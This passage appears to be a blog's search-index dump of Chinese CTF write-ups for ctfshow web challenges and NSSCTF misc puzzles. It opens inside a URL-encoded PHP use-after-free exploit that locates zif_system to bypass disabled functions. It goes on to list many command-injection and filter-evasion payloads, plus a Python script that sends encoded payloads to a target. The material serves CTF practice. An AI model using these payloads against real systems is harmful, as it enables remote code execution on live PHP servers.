%24data_addr%20%2B%20%24i%20*%208%3B%0A%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%7D%0A%0A%20%20%20%20function%20get_binary_base(%24binary_leak)%20%7B%0A%20%20%20%20%20%20%20%20%24base%20%3D%200%3B%0A%20%20%20%20%20%20%20%20%24start%20%3D%20%24binary_leak%20%26%200xfffffffffffff000%3B%0A%20%20%20%20%20%20%20%20for(%24i%20%3D%200%3B%20%24i%20%3C%200x1000%3B%20%24i%2B%2B)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24addr%20%3D%20%24start%20-%200x1000%20*%20%24i%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24leak%20%3D%20leak(%24addr%2C%200%2C%207)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20if(%24leak%20%3D%3D%200x10102464c457f)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20return%20%24addr%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%7D%0A%0A%20%20%20%20function%20get_system(%24basic_funcs)%20%7B%0A%20%20%20%20%20%20%20%20%24addr%20%3D%20%24basic_funcs%3B%0A%20%20%20%20%20%20%20%20do%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24f_entry%20%3D%20leak(%24addr)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24f_name%20%3D%20leak(%24f_entry%2C%200%2C%206)%3B%0A%0A%20%20%20%20%20%20%20%20%20%20%20%20if(%24f_name%20%3D%3D%200x6d6574737973)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20return%20leak(%24addr%20%2B%208)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20%20%20%20%20%24addr%20%2B%3D%200x20%3B%0A%20%20%20%20%20%20%20%20%7D%20while(%24f_entry%20!%3D%200)%3B%0A%20%20%20%20%20%20%20%20return%20false%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20function%20trigger_uaf(%24arg)%20%7B%0A%0A%20%20%20%20%20%20%20%20%24arg%20%3D%20str_shuffle(&#x27;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#x27;)%3B%0A%20%20%20%20%20%20%20%20%24vuln%20%3D%20new%20Vuln()%3B%0A%20%20%20%20%20%20%20%20%24vuln-%3Ea%20%3D%20%24arg%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20if(stristr(PHP_OS%2C%20&#x27;WIN&#x27;))%20%7B%0A%20%20%20%20%20%20%20%20die(&#x27;This%20PoC%20is%20for%20*nix%20systems%20only.&#x27;)%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20%24n_alloc%20%3D%2010%3B%20%0A%20%20%20%20%24contiguous%20%3D%20%5B%5D%3B%0A%20%20%20%20for(%24i%20%3D%200%3B%20%24i%20%3C%20%24n_alloc%3B%20%24i%2B%2B)%0A%20%20%20%20%20%20%20%20%24contiguous%5B%5D%20%3D%20str_shuffle(&#x27;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#x27;)%3B%0A%0A%20%20%20%20trigger_uaf(&#x27;x&#x27;)%3B%0A%20%20%20%20%24abc%20%3D%20%24backtrace%5B1%5D%5B&#x27;args&#x27;%5D%5B0%5D%3B%0A%0A%20%20%20%20%24helper%20%3D%20new%20Helper%3B%0A%20%20%20%20%24helper-%3Eb%20%3D%20function%20(%24x)%20%7B%20%7D%3B%0A%0A%20%20%20%20if(strlen(%24abc)%20%3D%3D%2079%20%7C%7C%20strlen(%24abc)%20%3D%3D%200)%20%7B%0A%20%20%20%20%20%20%20%20die(%22UAF%20failed%22)%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20%24closure_handlers%20%3D%20str2ptr(%24abc%2C%200)%3B%0A%20%20%20%20%24php_heap%20%3D%20str2ptr(%24abc%2C%200x58)%3B%0A%20%20%20%20%24abc_addr%20%3D%20%24php_heap%20-%200xc8%3B%0A%0A%20%20%20%20write(%24abc%2C%200x60%2C%202)%3B%0A%20%20%20%20write(%24abc%2C%200x70%2C%206)%3B%0A%0A%20%20%20%20write(%24abc%2C%200x10%2C%20%24abc_addr%20%2B%200x60)%3B%0A%20%20%20%20write(%24abc%2C%200x18%2C%200xa)%3B%0A%0A%20%20%20%20%24closure_obj%20%3D%20str2ptr(%24abc%2C%200x20)%3B%0A%0A%20%20%20%20%24binary_leak%20%3D%20leak(%24closure_handlers%2C%208)%3B%0A%20%20%20%20if(!(%24base%20%3D%20get_binary_base(%24binary_leak)))%20%7B%0A%20%20%20%20%20%20%20%20die(%22Couldn&#x27;t%20determine%20binary%20base%20address%22)%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20if(!(%24elf%20%3D%20parse_elf(%24base)))%20%7B%0A%20%20%20%20%20%20%20%20die(%22Couldn&#x27;t%20parse%20ELF%20header%22)%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20if(!(%24basic_funcs%20%3D%20get_basic_funcs(%24base%2C%20%24elf)))%20%7B%0A%20%20%20%20%20%20%20%20die(%22Couldn&#x27;t%20get%20basic_functions%20address%22)%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20if(!(%24zif_system%20%3D%20get_system(%24basic_funcs)))%20%7B%0A%20%20%20%20%20%20%20%20die(%22Couldn&#x27;t%20get%20zif_system%20address%22)%3B%0A%20%20%20%20%7D%0A%0A%0A%20%20%20%20%24fake_obj_offset%20%3D%200xd0%3B%0A%20%20%20%20for(%24i%20%3D%200%3B%20%24i%20%3C%200x110%3B%20%24i%20%2B%3D%208)%20%7B%0A%20%20%20%20%20%20%20%20write(%24abc%2C%20%24fake_obj_offset%20%2B%20%24i%2C%20leak(%24closure_obj%2C%20%24i))%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20write(%24abc%2C%200x20%2C%20%24abc_addr%20%2B%20%24fake_obj_offset)%3B%0A%20%20%20%20write(%24abc%2C%200xd0%20%2B%200x38%2C%201%2C%204)%3B%20%0A%20%20%20%20write(%24abc%2C%200xd0%20%2B%200x68%2C%20%24zif_system)%3B%20%0A%0A%20%20%20%20(%24helper-%3Eb)(%24cmd)%3B%0A%20%20%20%20exit()%3B%0A%7D%0A%0Actfshow(%22cat%20%2Fflag0.txt%22)%3Bob_end_flush()%3B%0A%3F%3E 得到flag web73glob遍历目录，涨知识了。 1234567c=?&gt;&lt;?php $a=new DirectoryIterator(&quot;glob:///*&quot;);foreach($a as $f)&#123;echo($f-&gt;__toString().&#x27; &#x27;);&#125;exit(0);?&gt; 要进行url编码发现了flagc.txtpayload: 1c=include(&quot;/flagc.txt&quot;);exit(); web74还是同样的步骤，glob遍历目录flag在flagx.txt里payload： 1c=include(&quot;/flagx.txt&quot;);exit();","categories":[{"name":"web","slug":"web","permalink":"https://lvzhouhang.xyz/categories/web/"},{"name":"ctfshow","slug":"web/ctfshow","permalink":"https://lvzhouhang.xyz/categories/web/ctfshow/"},{"name":"刷题","slug":"web/ctfshow/刷题","permalink":"https://lvzhouhang.xyz/categories/web/ctfshow/%E5%88%B7%E9%A2%98/"}],"tags":[{"name":"ctfshow","slug":"ctfshow","permalink":"https://lvzhouhang.xyz/tags/ctfshow/"},{"name":"刷题","slug":"刷题","permalink":"https://lvzhouhang.xyz/tags/%E5%88%B7%E9%A2%98/"},{"name":"web","slug":"web","permalink":"https://lvzhouhang.xyz/tags/web/"}]},{"title":"NSSCTF MISC刷题","slug":"NSSCTF-MISC刷题","date":"2023-01-24T11:17:06.000Z","updated":"2025-04-19T13:25:36.771Z","comments":true,"path":"2023/01/24/NSSCTF-MISC刷题/","permalink":"https://lvzhouhang.xyz/2023/01/24/NSSCTF-MISC%E5%88%B7%E9%A2%98/","excerpt":"[SWPUCTF 2021 新生赛]我的银行卡密码压缩包有密码，而且是6位数。用ARCHPR破解，密码是768521。","text":"[SWPUCTF 2021 新生赛]我的银行卡密码压缩包有密码，而且是6位数。用ARCHPR破解，密码是768521。 解压之后是一个md文件直接就懵了，看别人的wp后发现是用手机的九宫格解密的，还是写的少，涨知识了。解出来之后是YLOPJOGJVOCCYNMZYPGXGPOGJDVIGATBASH后面的ATBASH就是提示将YLOPJOGJVOCCYNMZYPGXGPOGJDVIG进行ATBASH解密，得到BOLKQLTQELXXBMNABKTCTKLTQWERT，后面的QWERT就是QWERT加密，也是个提示。将BOLKQLTQELXXBMNABKTCTKLT进行QWERT解密，得到XISRASEACSUUXZYKXREVERSE,后面的reverse还是个提示得到XKYZXUUSCAESARSIX,caesar six也是个提示凯撒密码6，得到RESTROOM，最后在RESERVE一下NSSCTF&#123;moortser&#125;就是flag。 [SWPU 2019]漂流记的马里奥点开exe文件出现一个1.txt提示是ntfs，可以用NtfsStreamsEditor2或者膜拜xenny大佬cmd转到文件地址，命令行notepad 1.txt:flag.txt最后的flag是NSSCTF&#123;ddg_is_cute&#125; [SWPUCTF 2021 新生赛]gif好像有点大下载文件后是个GIF图，用STEG SOLVE打开，在第562帧的时候有一个二维码，扫码就是flag NSSCTF&#123;The_G1F_ls_T00_b1g&#125; [HUBUCTF 2022 新生赛]最简单的misc用stegsolve打开，LSB隐写，得到一个二维码，然后扫码之后就是flag:NSSCTF&#123;aacc4238460996f0178c18d7637c9dd5&#125; 唉！misc题写的恶心，就是跟作者对脑电波嘛。","categories":[{"name":"MISC","slug":"MISC","permalink":"https://lvzhouhang.xyz/categories/MISC/"},{"name":"NSSCTF","slug":"MISC/NSSCTF","permalink":"https://lvzhouhang.xyz/categories/MISC/NSSCTF/"},{"name":"刷题","slug":"MISC/NSSCTF/刷题","permalink":"https://lvzhouhang.xyz/categories/MISC/NSSCTF/%E5%88%B7%E9%A2%98/"}],"tags":[{"name":"刷题","slug":"刷题","permalink":"https://lvzhouhang.xyz/tags/%E5%88%B7%E9%A2%98/"},{"name":"MISC","slug":"MISC","permalink":"https://lvzhouhang.xyz/tags/MISC/"},{"name":"NSSCTF","slug":"NSSCTF","permalink":"https://lvzhouhang.xyz/tags/NSSCTF/"}]},{"title":"ctfshow web入门57~68","slug":"ctfshow-web入门57","date":"2023-01-22T06:59:58.000Z","updated":"2025-04-19T13:25:38.279Z","comments":true,"path":"2023/01/22/ctfshow-web入门57/","permalink":"https://lvzhouhang.xyz/2023/01/22/ctfshow-web%E5%85%A5%E9%97%A857/","excerpt":"web57题目显示flag在36.php中，而且给出cat和php了，只要想办法构造出36就可以了。$(())是做运算，$(($&#123;_&#125;))=0,所以只要拼接除-36之后取反就行payload: 1?c=$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))","text":"web57题目显示flag在36.php中，而且给出cat和php了，只要想办法构造出36就可以了。$(())是做运算，$(($&#123;_&#125;))=0,所以只要拼接除-36之后取反就行payload: 1?c=$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(()))))))) web58题很短，但是我不会。。。参考文章payload太多了 1c=show_source(&quot;flag.php&quot;); web59和web58差不多。payload： 1c=show_source(&quot;flag.php&quot;); web60和前两道题一样。payload: 1c=show_source(&quot;flag.php&quot;); web 61~65这些题都一样。payload： 1c=show_source(&quot;flag.php&quot;); web66这一道题show_source不能用了。而且flag还不在flag.php中。先用 1var_dump(scandir(&#x27;/&#x27;)); 查看目录结构，发现是flag.txtpayload: 1c=highlight_flie(&quot;/flag.txt&quot;); web67这一题和上一题一样。 1c=highlight_file(&quot;/flag.txt&quot;); web68这一道题我都懵了，怎么不给源码啊。看别人的wp说的换成文件包含就可以。。。。payload: 1c=include(&quot;/flag.txt&quot;);","categories":[{"name":"web","slug":"web","permalink":"https://lvzhouhang.xyz/categories/web/"},{"name":"ctfshow","slug":"web/ctfshow","permalink":"https://lvzhouhang.xyz/categories/web/ctfshow/"},{"name":"刷题","slug":"web/ctfshow/刷题","permalink":"https://lvzhouhang.xyz/categories/web/ctfshow/%E5%88%B7%E9%A2%98/"}],"tags":[{"name":"ctfshow","slug":"ctfshow","permalink":"https://lvzhouhang.xyz/tags/ctfshow/"},{"name":"刷题","slug":"刷题","permalink":"https://lvzhouhang.xyz/tags/%E5%88%B7%E9%A2%98/"},{"name":"web","slug":"web","permalink":"https://lvzhouhang.xyz/tags/web/"}]},{"title":"ctfshow web入门53~56","slug":"ctfshow-web入门52~56","date":"2023-01-20T09:23:44.000Z","updated":"2025-04-19T13:25:36.810Z","comments":true,"path":"2023/01/20/ctfshow-web入门52~56/","permalink":"https://lvzhouhang.xyz/2023/01/20/ctfshow-web%E5%85%A5%E9%97%A852~56/","excerpt":"web53多过滤了一个wget，多添加了一个回显。payload: 1?c=ca&#x27;&#x27;t$&#123;IFS&#125;fla&#x27;&#x27;g.php","text":"web53多过滤了一个wget，多添加了一个回显。payload: 1?c=ca&#x27;&#x27;t$&#123;IFS&#125;fla&#x27;&#x27;g.php web54这道将使用&#39;&#39;的方式给剔除了。去网上找其他人的wp发现好几种方法。第一种：可以用mv。payload: 12/?c=mv$&#123;IFS&#125;fla?.php$&#123;IFS&#125;abc.txt/abc.txt 第二种： 1grep test *file #在当前目录中，查找后缀有 file 字样的文件中包含 test 字符串的文件，并打印出该字符串的行 payload： 1?c=grep$&#123;IFS&#125;ctf$&#123;IFS&#125;fl???php 第三种：可以用rev逆序输出payload: 1?c=rev$&#123;IFS&#125;fl?????? 第四种：用paste直接查看payload: 1?c=paste$&#123;IFS&#125;fl?????? 第五种：可以理解为当前目录运行cat命令实际上运行的也是bin/cat。payload： 1/bin/?at$&#123;IFS&#125;fl?????? web55题是真的恶心，脑子有点痒，感觉要长脑子了。。。。继无字母数字的命令执行(ctfshow web入门 55)新姿势payload: 1?c=/???/????64 ????.??? web56题是越来越难了。参考P神的文章上无字母数字webshell之提高篇首先构造一个POST上传文件的数据包 12345678910111213141516&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt; &lt;title&gt;POST文件上传&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;form action=&quot;http://17d01aae-51d9-48fe-abfb-d9ba10037d72.chall.ctf.show/&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt; &lt;!--链接是当前打开的题目链接--&gt; &lt;label for=&quot;file&quot;&gt;文件名：&lt;/label&gt; &lt;input type=&quot;file&quot; name=&quot;file&quot; id=&quot;file&quot;&gt;&lt;br&gt; &lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;提交&quot;&gt;&lt;/form&gt;&lt;/body&gt;&lt;/html&gt; 上传一个php文件 12#!/bin/shls 注：shell程序必须以”#!/bin/sh”开始，#! /bin/sh 是指此脚本使用/bin/sh来解释执行，#!是特殊的表示符，其后面跟的是解释此脚本的shell的路径用bp抓包抓包之后添加参数c如下，多发包几次（因为并不一定生成的临时文件的最后一个字母就是大写字母），可以看到执行了ls命令参数内容为什么是 .%20/???/????????[@-[] ,P神的文章已经写的很详细了。最后用cat看一下就可以了","categories":[{"name":"web","slug":"web","permalink":"https://lvzhouhang.xyz/categories/web/"},{"name":"ctfshow","slug":"web/ctfshow","permalink":"https://lvzhouhang.xyz/categories/web/ctfshow/"},{"name":"刷题","slug":"web/ctfshow/刷题","permalink":"https://lvzhouhang.xyz/categories/web/ctfshow/%E5%88%B7%E9%A2%98/"}],"tags":[{"name":"ctfshow","slug":"ctfshow","permalink":"https://lvzhouhang.xyz/tags/ctfshow/"},{"name":"刷题","slug":"刷题","permalink":"https://lvzhouhang.xyz/tags/%E5%88%B7%E9%A2%98/"},{"name":"web","slug":"web","permalink":"https://lvzhouhang.xyz/tags/web/"}]},{"title":"ctfshow 刷题web45~52","slug":"ctfshow-刷题web45~52","date":"2023-01-17T08:34:13.000Z","updated":"2025-04-19T13:25:36.810Z","comments":true,"path":"2023/01/17/ctfshow-刷题web45~52/","permalink":"https://lvzhouhang.xyz/2023/01/17/ctfshow-%E5%88%B7%E9%A2%98web45~52/","excerpt":"web45过滤了空格，用%09绕过，&amp;&amp;等于;，也可以用||和%0a。payload: 123/?c=tac%09fl*||/?c=sort%09fl*||/?c=echo%09`tac%09fla*`||","text":"web45过滤了空格，用%09绕过，&amp;&amp;等于;，也可以用||和%0a。payload: 123/?c=tac%09fl*||/?c=sort%09fl*||/?c=echo%09`tac%09fla*`|| web46多过滤了一些字符，但还是可以%09过滤空格，因为%09解码后就不是数字了，是一个水平制表符。*被过滤了，可以用?payload: 12/?c=tac%09fla?.php||/?c=nl&lt;fla&#x27;&#x27;g.php|| nl查看源代码，&lt;代替空格，&#x27;&#x27;分割flag过滤，||解决命令黑洞 web47无非就是sort无法用了，上一题的payload还可以用。 web48上一题的payload依然可以用。 web49依然可以用。 web50%09过滤了，&lt;&gt;和?一起使用时没有回显,所以这里的?可以用\\和&#39;&#39;进行代替,。paylaod: 12/?c=tac&lt;fla\\g.php||/?c=nl&lt;fla&#x27;&#x27;g.php|| web51tac被过滤了，只能用nl。payload: 1?c=nl&lt;fla\\g.php|| web52&lt;&gt;也被过滤了，还可以用$IFSpayload: 1/?c=nl$&#123;IFS&#125;fla\\g.php||","categories":[{"name":"web","slug":"web","permalink":"https://lvzhouhang.xyz/categories/web/"},{"name":"ctfshow","slug":"web/ctfshow","permalink":"https://lvzhouhang.xyz/categories/web/ctfshow/"},{"name":"刷题","slug":"web/ctfshow/刷题","permalink":"https://lvzhouhang.xyz/categories/web/ctfshow/%E5%88%B7%E9%A2%98/"}],"tags":[{"name":"ctfshow","slug":"ctfshow","permalink":"https://lvzhouhang.xyz/tags/ctfshow/"},{"name":"刷题","slug":"刷题","permalink":"https://lvzhouhang.xyz/tags/%E5%88%B7%E9%A2%98/"},{"name":"web","slug":"web","permalink":"https://lvzhouhang.xyz/tags/web/"}]},{"title":"ctfshow web入门41~44","slug":"ctfshow41-44","date":"2023-01-14T08:14:20.000Z","updated":"2025-04-19T13:25:36.810Z","comments":true,"path":"2023/01/14/ctfshow41-44/","permalink":"https://lvzhouhang.xyz/2023/01/14/ctfshow41-44/","excerpt":"web41这个题过滤了$、+、-、^、~使得异或自增和取反构造字符都无法使用，同时过滤了字母和数字。但是特意留了个或运算符|。我们可以尝试从ascii为0-255的字符中，找到或运算能得到我们可用的字符的字符。","text":"web41这个题过滤了$、+、-、^、~使得异或自增和取反构造字符都无法使用，同时过滤了字母和数字。但是特意留了个或运算符|。我们可以尝试从ascii为0-255的字符中，找到或运算能得到我们可用的字符的字符。 借用师傅们的脚本：https://blog.csdn.net/miuzzx/article/details/108569080 123456789101112131415161718192021222324252627282930313233343536&lt;?php$myfile = fopen(&quot;rce_or.txt&quot;, &quot;w&quot;);$contents=&quot;&quot;;for ($i=0; $i &lt; 256; $i++) &#123; for ($j=0; $j &lt;256 ; $j++) &#123; if($i&lt;16)&#123; $hex_i=&#x27;0&#x27;.dechex($i); &#125; else&#123; $hex_i=dechex($i); &#125; if($j&lt;16)&#123; $hex_j=&#x27;0&#x27;.dechex($j); &#125; else&#123; $hex_j=dechex($j); &#125; $preg = &#x27;/[0-9]|[a-z]|\\^|\\+|\\~|\\$|\\[|\\]|\\&#123;|\\&#125;|\\&amp;|\\-/i&#x27;; if(preg_match($preg , hex2bin($hex_i))||preg_match($preg , hex2bin($hex_j)))&#123; echo &quot;&quot;; &#125; else&#123; $a=&#x27;%&#x27;.$hex_i; $b=&#x27;%&#x27;.$hex_j; $c=(urldecode($a)|urldecode($b)); if (ord($c)&gt;=32&amp;ord($c)&lt;=126) &#123; $contents=$contents.$c.&quot; &quot;.$a.&quot; &quot;.$b.&quot;\\n&quot;; &#125; &#125;&#125;&#125;fwrite($myfile,$contents);fclose($myfile); 1234567891011121314151617181920212223242526272829303132333435363738# -*- coding: utf-8 -*-import requestsimport urllibfrom sys import *import osos.system(&quot;php rce_or.php&quot;) #没有将php写入环境变量需手动运行if(len(argv)!=2): print(&quot;=&quot;*50) print(&#x27;USER：python exp.py &lt;url&gt;&#x27;) print(&quot;eg： python exp.py http://ctf.show/&quot;) print(&quot;=&quot;*50) exit(0)url=argv[1]def action(arg): s1=&quot;&quot; s2=&quot;&quot; for i in arg: f=open(&quot;rce_or.txt&quot;,&quot;r&quot;) while True: t=f.readline() if t==&quot;&quot;: break if t[0]==i: #print(i) s1+=t[2:5] s2+=t[6:9] break f.close() output=&quot;(\\&quot;&quot;+s1+&quot;\\&quot;|\\&quot;&quot;+s2+&quot;\\&quot;)&quot; return(output) while True: param=action(input(&quot;\\n[+] your function：&quot;) )+action(input(&quot;[+] your command：&quot;)) data=&#123; &#x27;c&#x27;:urllib.parse.unquote(param) &#125; r=requests.post(url,data=data) print(&quot;\\n[*] result:\\n&quot;+r.text) 得到flag web42 123451：&gt; 代表重定向到哪里，例如：echo “123” &gt; /home/123.txt2：/dev/null 代表空设备文件3：2&gt; 表示stderr标准错误4：&amp; 表示等同于的意思，2&gt;&amp;1，表示2的输出重定向等同于15：1 表示stdout标准输出，系统默认值是1，所以&quot;&gt;/dev/null&quot;等同于 “1&gt;/dev/null” 参考：https://www.cnblogs.com/kexianting/p/11630085.html用双写绕过payload: 1?c=cat flag.php;ls web43将;过滤掉了，可以使用其他的命令分隔符；常见的命令分隔符： 1234567891011121、“;”分隔符用分号分隔的命令会按顺序执行，即使中间命令使用方式不对，会有相关错误输出，后面的命令照样会执行。如：输入：命令A；命令B；命令C按顺序执行A、B、C命令，若B命令调用方式不对，终端会有相关错误提示，提示后会继续执行C命令。2、“&amp;&amp;”分隔符同C、C++语言逻辑运算符&quot;&amp;&amp;&quot;类似，遇到首个命令执行失败后，后面的命令不会执行。如：输入：命令A &amp;&amp; 命令B &amp;&amp; 命令C先执行命令A，若A命令执行正确则再执行命令B。假如命令B执行失败，则停止，C命令不会被执行到。3、“||”分隔符同C、C++语言逻辑运算符&quot;||&quot;类似，遇到首个命令执行成功后，后面的命令不会执行。如：输入：命令A || 命令B || 命令C先执行命令A，若A命令执行失败则再执行命令B。假如命令B执行成功，则停止，C命令不会被执行到。 payload： 1?c=tac flag.php||ls web44flag也过滤了，就用通配符呗。payload: 1/?c=tac fl*||ls 常见的通配符有*、?。","categories":[{"name":"web","slug":"web","permalink":"https://lvzhouhang.xyz/categories/web/"},{"name":"ctfshow","slug":"web/ctfshow","permalink":"https://lvzhouhang.xyz/categories/web/ctfshow/"},{"name":"刷题","slug":"web/ctfshow/刷题","permalink":"https://lvzhouhang.xyz/categories/web/ctfshow/%E5%88%B7%E9%A2%98/"}],"tags":[{"name":"ctfshow","slug":"ctfshow","permalink":"https://lvzhouhang.xyz/tags/ctfshow/"},{"name":"刷题","slug":"刷题","permalink":"https://lvzhouhang.xyz/tags/%E5%88%B7%E9%A2%98/"},{"name":"web","slug":"web","permalink":"https://lvzhouhang.xyz/tags/web/"}]},{"title":"chtshow web入门37~40","slug":"chtshow37-40","date":"2023-01-11T08:21:29.000Z","updated":"2025-04-19T13:25:36.810Z","comments":true,"path":"2023/01/11/chtshow37-40/","permalink":"https://lvzhouhang.xyz/2023/01/11/chtshow37-40/","excerpt":"web 37考察data伪协议，data伪协议需满足allow_url_fopen，allow_url_include同时开启才能使用。payload： 1/?c=data://text/plain,&lt;?php system(&quot;cat fl*&quot;);?&gt; web38php被过滤了，可以用短标签绕过php。短标签：比更灵活调用的方法 paylaod： 12?c=data://text/plain,&lt;?=`cat fla*`;?&gt;/?c=data://text/plain,&lt;?=system(&quot;cat fl*&quot;);?&gt;","text":"web 37考察data伪协议，data伪协议需满足allow_url_fopen，allow_url_include同时开启才能使用。payload： 1/?c=data://text/plain,&lt;?php system(&quot;cat fl*&quot;);?&gt; web38php被过滤了，可以用短标签绕过php。短标签：比更灵活调用的方法 paylaod： 12?c=data://text/plain,&lt;?=`cat fla*`;?&gt;/?c=data://text/plain,&lt;?=system(&quot;cat fl*&quot;);?&gt; web39include中多了个.php，但是上一题的payload也管用，看别人的wp说是有?&gt;结尾进行闭合，所以没有影响。payload: 1/?c=data://text/plain,&lt;?php system(&quot;cat fla*&quot;)?&gt; web40这个过滤了不少东西，但是没有过滤英文字母、下划线和英文的括号。可以用提示的方法 1234567show_source(next(array_reverse(scandir(pos(localeconv())))));show_source()函数对文件进行语法高亮显示next() 函数将内部指针指向数组中的下一个元素，并输出array_reverse() 函数以相反的元素顺序返回数组scandir() 函数返回指定目录中的文件和目录的数组pos() 函数返回数组中的当前元素的值localeconv() 函数返回一包含本地数字及货币格式信息的数组 也可以换其他方法首先 1/?c=print_r(get_defined_vars()); 获得一下信息使用next获取这个数组的下一个位置的元素，也就是POST的元素. 1/?c=print_r(next(get_defined_vars())); 然后把这个元素弹出，用array_pop 1/?c=print_r(array_pop(next(get_defined_vars()))); 最后再用eval执行一下就可以了 1/?c=eval(array_pop(next(get_defined_vars()))); POST数据 11=system(&quot;cat flag.php&quot;);或1=echo`cat flag.php`; 关于echo、print、print_r的区别可以参考：https://blog.51cto.com/zlong37/1556855 常用的注释符1#、--、-- -、//、/**/、/*letmetest*/、;%00 MySQL中可以代替空格的字符1/**/、()、=、%20、%09、%0a、0x0a、0x0b、0x0c、0x0d、+、-、~、.等等","categories":[{"name":"web","slug":"web","permalink":"https://lvzhouhang.xyz/categories/web/"},{"name":"ctfshow","slug":"web/ctfshow","permalink":"https://lvzhouhang.xyz/categories/web/ctfshow/"},{"name":"刷题","slug":"web/ctfshow/刷题","permalink":"https://lvzhouhang.xyz/categories/web/ctfshow/%E5%88%B7%E9%A2%98/"}],"tags":[{"name":"ctfshow","slug":"ctfshow","permalink":"https://lvzhouhang.xyz/tags/ctfshow/"},{"name":"刷题","slug":"刷题","permalink":"https://lvzhouhang.xyz/tags/%E5%88%B7%E9%A2%98/"},{"name":"web","slug":"web","permalink":"https://lvzhouhang.xyz/tags/web/"}]},{"title":"ctfshow web入门29~36","slug":"ctfshow29-36","date":"2023-01-09T07:00:00.000Z","updated":"2025-04-19T13:25:36.810Z","comments":true,"path":"2023/01/09/ctfshow29-36/","permalink":"https://lvzhouhang.xyz/2023/01/09/ctfshow29-36/","excerpt":"web29过滤了flag，可以用system,echo等. 12/?c=system(&quot;cat fla*&quot;);/?c=echo`cat fl*`; web30多过滤了一个system，还可以用echo. 1/?echo`cat fl*`;","text":"web29过滤了flag，可以用system,echo等. 12/?c=system(&quot;cat fla*&quot;);/?c=echo`cat fl*`; web30多过滤了一个system，还可以用echo. 1/?echo`cat fl*`; web31cat和空格过滤了，可以用tac.空格可以用%09绕过. 1/?c=echo%09`tac%09fl*`; web32过滤的东西太多了左括号都给过滤了，使用命令逃逸+文件包含.空格可以用%09绕过， ；可以用?&gt;绕过,因为使用?&gt;，所以后面没办法直接拼接php语句，需要使用文件包含. 1/?c=include%09$_GET[1]?&gt;&amp;&amp;1=php://filter/convert.base64-encode/resource=flag.php 再将得到的进行base64解码得到flag web33和web32差不多，用同样的payload就行 1/?c=include%09$_GET[1]?&gt;&amp;&amp;1=php://filter/convert.base64-encode/resource=flag.php web34依旧可以用同样的payload 1/?c=include%09$_GET[1]?&gt;&amp;&amp;1=php://filter/convert.base64-encode/resource=flag.php web35依旧可以用同样的payload 1/?c=include%09$_GET[1]?&gt;&amp;&amp;1=php://filter/convert.base64-encode/resource=flag.php 连续几道题都一样，写的真恶心. web36这道题把1换成其他的字符就行，其他步骤一样. 1/?c=include%09$_GET[a]?&gt;&amp;&amp;a=php://filter/convert.base64-encode/resource=flag.php require可以代替include，PHP常用的可以不加括号的函数echo、print、isset、unset、include、require.","categories":[{"name":"web","slug":"web","permalink":"https://lvzhouhang.xyz/categories/web/"},{"name":"ctfshow","slug":"web/ctfshow","permalink":"https://lvzhouhang.xyz/categories/web/ctfshow/"},{"name":"刷题","slug":"web/ctfshow/刷题","permalink":"https://lvzhouhang.xyz/categories/web/ctfshow/%E5%88%B7%E9%A2%98/"}],"tags":[{"name":"ctfshow","slug":"ctfshow","permalink":"https://lvzhouhang.xyz/tags/ctfshow/"},{"name":"刷题","slug":"刷题","permalink":"https://lvzhouhang.xyz/tags/%E5%88%B7%E9%A2%98/"},{"name":"web","slug":"web","permalink":"https://lvzhouhang.xyz/tags/web/"}]}],"categories":[{"name":"HackMyVM","slug":"HackMyVM","permalink":"https://lvzhouhang.xyz/categories/HackMyVM/"},{"name":"春秋云镜","slug":"春秋云镜","permalink":"https://lvzhouhang.xyz/categories/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/"},{"name":"660930334","slug":"660930334","permalink":"https://lvzhouhang.xyz/categories/660930334/"},{"name":"HackMyVMxxs","slug":"HackMyVMxxs","permalink":"https://lvzhouhang.x